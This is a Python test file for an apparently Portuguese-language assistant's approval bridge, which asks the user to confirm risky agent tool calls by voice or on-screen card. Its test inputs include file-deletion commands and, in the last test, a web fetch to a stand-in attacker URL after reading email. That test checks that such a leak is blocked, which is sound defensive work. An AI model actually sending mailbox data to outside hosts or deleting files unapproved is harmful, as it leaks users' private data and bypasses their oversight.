import json
import threading
import time
import urllib.error
import urllib.request

import pytest

from lia.confirm import ConfirmBridge, parse_voice_approval
from lia.bridge_server import start_bridge
from lia.permissions import ActionCard

CARD = ActionCard("Executar comando", "dir", "Executar comando: dir. Posso?")


def make_bridge(timeout=5):
    shown = []
    bridge = ConfirmBridge(timeout, lambda rid, card: shown.append((rid, card)), lambda rid: None)
    return bridge, shown


def run_request(bridge, results):
    t = threading.Thread(target=lambda: results.append(bridge.request(CARD)))
    t.start()
    return t


def wait_shown(shown):
    for _ in range(100):
        if shown:
            return shown[-1][0]
        time.sleep(0.01)
    raise AssertionError("cartão não apareceu")


@pytest.mark.parametrize("text", ["pode", "Pode!", "Vestion, pode mandar.", "confirmo", "sim pode"])
def test_voice_approves(text):
    assert parse_voice_approval(text)


@pytest.mark.parametrize("text", ["não", "pode ser", "pode ser que sim", "acho que pode", "", "cancela"])
def test_voice_cancels(text):
    assert not parse_voice_approval(text)


def test_request_times_out_false():
    bridge, _ = make_bridge(timeout=0.2)
    assert bridge.request(CARD) is False


def test_resolve_true():
    bridge, shown = make_bridge()
    results = []
    t = run_request(bridge, results)
    bridge.resolve(wait_shown(shown), True)
    t.join(2)
    assert results == [True]


def test_voice_answer_ignored_before_window():
    bridge, shown = make_bridge(timeout=0.5)
    results = []
    t = run_request(bridge, results)
    wait_shown(shown)
    assert bridge.voice_answer("pode") is False
    t.join(2)
    assert results == [False]


def test_voice_answer_inside_window_approves():
    bridge, shown = make_bridge()
    results = []
    t = run_request(bridge, results)
    rid = wait_shown(shown)
    bridge.open_voice_window(rid, 15)
    assert bridge.voice_answer("pode mandar") is True
    t.join(2)
    assert results == [True]


def test_cancel_all_denies_pending():
    bridge, shown = make_bridge()
    results = []
    t = run_request(bridge, results)
    wait_shown(shown)
    bridge.cancel_all()
    t.join(2)
    assert results == [False]


def _post(port, token, body):
    req = urllib.request.Request(f"http://127.0.0.1:{port}/confirm", data=json.dumps(body).encode(),
                                 headers={"X-Lia-Token": token, "Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=5) as r:
        return json.loads(r.read())


def test_http_wrong_token_403():
    bridge, _ = make_bridge()
    port, _token = start_bridge(bridge)
    with pytest.raises(urllib.error.HTTPError) as e:
        _post(port, "errado", {"tool_name": "Bash", "input": {"command": "dir"}})
    assert e.value.code == 403


def test_http_roundtrip():
    bridge, shown = make_bridge()
    port, token = start_bridge(bridge)
    threading.Thread(target=lambda: bridge.resolve(wait_shown(shown), True)).start()
    assert _post(port, token, {"tool_name": "Bash", "input": {"command": "del a.txt"}}) == {"approved": True}
    assert shown[0][1].title == "Executar comando"


def test_http_safe_action_approved_without_card():
    bridge, shown = make_bridge()
    port, token = start_bridge(bridge)
    assert _post(port, token, {"tool_name": "Bash", "input": {"command": "dir"}}) == {"approved": True}
    assert shown == []


def test_http_important_action_shows_card():
    bridge, shown = make_bridge()
    port, token = start_bridge(bridge)
    threading.Thread(target=lambda: bridge.resolve(wait_shown(shown), False)).start()
    assert _post(port, token, {"tool_name": "Bash", "input": {"command": "Remove-Item a.txt"}}) == {"approved": False}
    assert shown[0][1].title == "Executar comando"


def test_http_uses_custom_describer_for_card():
    from lia.permissions import ActionCard as Card
    bridge, shown = make_bridge()
    port, token = start_bridge(bridge, describe=lambda name, inp: Card("Cancelar compromisso", "Reunião real — 30/10 15:00", "Posso?"))
    threading.Thread(target=lambda: bridge.resolve(wait_shown(shown), False)).start()
    assert _post(port, token, {"tool_name": "mcp__lia__agenda_cancelar", "input": {"id": "e1"}}) == {"approved": False}
    assert shown[0][1].detail == "Reunião real — 30/10 15:00"


def test_http_after_reading_mail_site_asks_until_next_request():
    from lia.permissions import Taint
    taint = Taint()
    bridge, shown = make_bridge(timeout=0.3)
    port, token = start_bridge(bridge, taint=taint)
    fetch = {"tool_name": "WebFetch", "input": {"url": "https://evil.example/?q=x"}}
    assert _post(port, token, fetch) == {"approved": True} and shown == []
    assert _post(port, token, {"tool_name": "mcp__lia__gmail_ler", "input": {"id": "1"}}) == {"approved": True}
    assert _post(port, token, fetch) == {"approved": False} and len(shown) == 1  # cartão; ninguém aprovou
    taint.reset()  # novo pedido do usuário
    assert _post(port, token, fetch) == {"approved": True} and len(shown) == 1
